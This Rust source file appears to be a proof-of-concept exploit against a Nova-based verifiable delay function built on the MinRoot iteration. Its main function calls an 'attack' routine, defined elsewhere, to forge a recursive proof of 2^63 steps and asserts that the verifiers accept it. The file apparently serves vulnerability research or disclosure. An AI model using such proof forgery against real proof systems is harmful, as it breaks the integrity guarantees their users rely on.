//! Demonstrates how to use Nova to produce a recursive proof of the correct execution of
//! iterations of the MinRoot function, thereby realizing a Nova-based verifiable delay function (VDF).
//! We execute a configurable number of iterations of the MinRoot function per step of Nova's recursion.
type G1 = pasta_curves::pallas::Point;
type G2 = pasta_curves::vesta::Point;
use ::bellperson::{gadgets::num::AllocatedNum, ConstraintSystem, SynthesisError};
use ff::PrimeField;
use flate2::{write::ZlibEncoder, Compression};
use nova_snark::{
  traits::{
    circuit::{StepCircuit, TrivialTestCircuit},
    Group,
  },
  CompressedSNARK, PublicParams, RecursiveSNARK,
};
use num_bigint::BigUint;
use std::time::Instant;

#[derive(Clone, Debug)]
struct MinRootIteration<F: PrimeField> {
  x_i: F,
  y_i: F,
  x_i_plus_1: F,
  y_i_plus_1: F,
}

impl<F: PrimeField> MinRootIteration<F> {
  // produces a sample non-deterministic advice, executing one invocation of MinRoot per step
  fn new(num_iters: usize, x_0: &F, y_0: &F) -> (Vec<F>, Vec<Self>) {
    // although this code is written generically, it is tailored to Pallas' scalar field
    // (p - 3 / 5)
    let exp = BigUint::parse_bytes(
      b"23158417847463239084714197001737581570690445185553317903743794198714690358477",
      10,
    )
    .unwrap();

    let mut res = Vec::new();
    let mut x_i = *x_0;
    let mut y_i = *y_0;
    for _i in 0..num_iters {
      let x_i_plus_1 = (x_i + y_i).pow_vartime(exp.to_u64_digits()); // computes the fifth root of x_i + y_i

      // sanity check
      let sq = x_i_plus_1 * x_i_plus_1;
      let quad = sq * sq;
      let fifth = quad * x_i_plus_1;
      debug_assert_eq!(fifth, x_i + y_i);

      let y_i_plus_1 = x_i;

      res.push(Self {
        x_i,
        y_i,
        x_i_plus_1,
        y_i_plus_1,
      });

      x_i = x_i_plus_1;
      y_i = y_i_plus_1;
    }

    let z0 = vec![*x_0, *y_0];

    (z0, res)
  }
}

#[derive(Clone, Debug)]
struct MinRootCircuit<F: PrimeField> {
  seq: Vec<MinRootIteration<F>>,
}

impl<F> StepCircuit<F> for MinRootCircuit<F>
where
  F: PrimeField,
{
  fn arity(&self) -> usize {
    2
  }

  fn synthesize<CS: ConstraintSystem<F>>(
    &self,
    cs: &mut CS,
    z: &[AllocatedNum<F>],
  ) -> Result<Vec<AllocatedNum<F>>, SynthesisError> {
    let mut z_out: Result<Vec<AllocatedNum<F>>, SynthesisError> =
      Err(SynthesisError::AssignmentMissing);

    // use the provided inputs
    let x_0 = z[0].clone();
    let y_0 = z[1].clone();

    // variables to hold running x_i and y_i
    let mut x_i = x_0;
    let mut y_i = y_0;
    for i in 0..self.seq.len() {
      // non deterministic advice
      let x_i_plus_1 =
        AllocatedNum::alloc(cs.namespace(|| format!("x_i_plus_1_iter_{i}")), || {
          Ok(self.seq[i].x_i_plus_1)
        })?;

      // check the following conditions hold:
      // (i) x_i_plus_1 = (x_i + y_i)^{1/5}, which can be more easily checked with x_i_plus_1^5 = x_i + y_i
      // (ii) y_i_plus_1 = x_i
      // (1) constraints for condition (i) are below
      // (2) constraints for condition (ii) is avoided because we just used x_i wherever y_i_plus_1 is used
      let x_i_plus_1_sq = x_i_plus_1.square(cs.namespace(|| format!("x_i_plus_1_sq_iter_{i}")))?;
      let x_i_plus_1_quad =
        x_i_plus_1_sq.square(cs.namespace(|| format!("x_i_plus_1_quad_{i}")))?;
      cs.enforce(
        || format!("x_i_plus_1_quad * x_i_plus_1 = x_i + y_i_iter_{i}"),
        |lc| lc + x_i_plus_1_quad.get_variable(),
        |lc| lc + x_i_plus_1.get_variable(),
        |lc| lc + x_i.get_variable() + y_i.get_variable(),
      );

      if i == self.seq.len() - 1 {
        z_out = Ok(vec![x_i_plus_1.clone(), x_i.clone()]);
      }

      // update x_i and y_i for the next iteration
      y_i = x_i;
      x_i = x_i_plus_1;
    }

    z_out
  }

  fn output(&self, z: &[F]) -> Vec<F> {
    // sanity check
    debug_assert_eq!(z[0], self.seq[0].x_i);
    debug_assert_eq!(z[1], self.seq[0].y_i);

    // compute output using advice
    vec![
      self.seq[self.seq.len() - 1].x_i_plus_1,
      self.seq[self.seq.len() - 1].y_i_plus_1,
    ]
  }
}

//
fn main() {
  println!("========================================================================");
  println!("Demonstrating exploit against Nova-based VDF with MinRoot delay function");
  println!("========================================================================");

  // Attack Index = i = 2^63
  let i = 9223372036854775808;
  // number of iterations of MinRoot per Nova's recursive step
  let num_iters_per_step = 4096;

  let circuit_primary = MinRootCircuit {
    seq: vec![
      MinRootIteration {
        x_i: <G1 as Group>::Scalar::zero(),
        y_i: <G1 as Group>::Scalar::zero(),
        x_i_plus_1: <G1 as Group>::Scalar::zero(),
        y_i_plus_1: <G1 as Group>::Scalar::zero(),
      };
      num_iters_per_step
    ],
  };
  let circuit_secondary = TrivialTestCircuit::default();

  // produce public parameters
  let start = Instant::now();
  println!("Producing public parameters...");
  let pp = PublicParams::<
    G1,
    G2,
    MinRootCircuit<<G1 as Group>::Scalar>,
    TrivialTestCircuit<<G2 as Group>::Scalar>,
  >::setup(circuit_primary.clone(), circuit_secondary.clone());
  println!("PublicParams::setup, took {:?} ", start.elapsed());

  println!(
    "Number of constraints per step (primary circuit): {}",
    pp.num_constraints().0
  );
  println!(
    "Number of constraints per step (secondary circuit): {}",
    pp.num_constraints().1
  );

  println!(
    "Number of variables per step (primary circuit): {}",
    pp.num_variables().0
  );
  println!(
    "Number of variables per step (secondary circuit): {}",
    pp.num_variables().1
  );

  type C1 = MinRootCircuit<<G1 as Group>::Scalar>;
  type C2 = TrivialTestCircuit<<G2 as Group>::Scalar>;
  let z0_primary = vec![<G1 as Group>::Scalar::zero();circuit_primary.arity()];
  let z0_secondary = vec![<G2 as Group>::Scalar::zero();circuit_secondary.arity()];
  let zi_minus_one_primary = vec![<G1 as Group>::Scalar::zero();circuit_primary.arity()];
  let zi_minus_one_secondary = vec![<G2 as Group>::Scalar::zero();circuit_secondary.arity()];

  println!("Each IVC Step Performs {num_iters_per_step} iterations of Minroot.");
  println!("Generating fake proof of {i} IVC Steps.");
  println!("In total, faking {} Minroot iterations.", (i as u128) * (num_iters_per_step as u128));
  let start = Instant::now();
  let recursive_snark = RecursiveSNARK::<G1, G2, C1, C2>::attack(
    &pp,
    circuit_primary.clone(),
    circuit_secondary.clone(),
    z0_primary.clone(),
    z0_secondary.clone(),
    zi_minus_one_primary,
    zi_minus_one_secondary,
    i
  );
  println!("Generating fake proof took {:?}", start.elapsed());
  // verify the recursive SNARK
  println!("Verifying a RecursiveSNARK...");
  let start = Instant::now();
  let res = recursive_snark.verify(&pp, i, z0_primary.clone(), z0_secondary.clone());
  println!(
    "RecursiveSNARK::verify: {:?}, took {:?}",
    res.is_ok(),
    start.elapsed()
  );
  assert!(res.is_ok());

  // produce a compressed SNARK
  println!("Generating a CompressedSNARK using Spartan with IPA-PC...");
  let (pk, vk) = CompressedSNARK::<_, _, _, _, S1, S2>::setup(&pp).unwrap();

  let start = Instant::now();
  type EE1 = nova_snark::provider::ipa_pc::EvaluationEngine<G1>;
  type EE2 = nova_snark::provider::ipa_pc::EvaluationEngine<G2>;
  type S1 = nova_snark::spartan::RelaxedR1CSSNARK<G1, EE1>;
  type S2 = nova_snark::spartan::RelaxedR1CSSNARK<G2, EE2>;

  let res = CompressedSNARK::<_, _, _, _, S1, S2>::prove(&pp, &pk, &recursive_snark);
  println!(
    "CompressedSNARK::prove: {:?}, took {:?}",
    res.is_ok(),
    start.elapsed()
  );
  assert!(res.is_ok());
  let compressed_snark = res.unwrap();

  let mut encoder = ZlibEncoder::new(Vec::new(), Compression::default());
  bincode::serialize_into(&mut encoder, &compressed_snark).unwrap();
  let compressed_snark_encoded = encoder.finish().unwrap();
  println!(
    "CompressedSNARK::len {:?} bytes",
    compressed_snark_encoded.len()
  );

  // verify the compressed SNARK
  println!("Verifying a CompressedSNARK...");
  let start = Instant::now();
  let res = compressed_snark.verify(&vk, i, z0_primary, z0_secondary);
  println!(
    "CompressedSNARK::verify: {:?}, took {:?}",
    res.is_ok(),
    start.elapsed()
  );
  assert!(res.is_ok());
  println!("=========================================================");
}
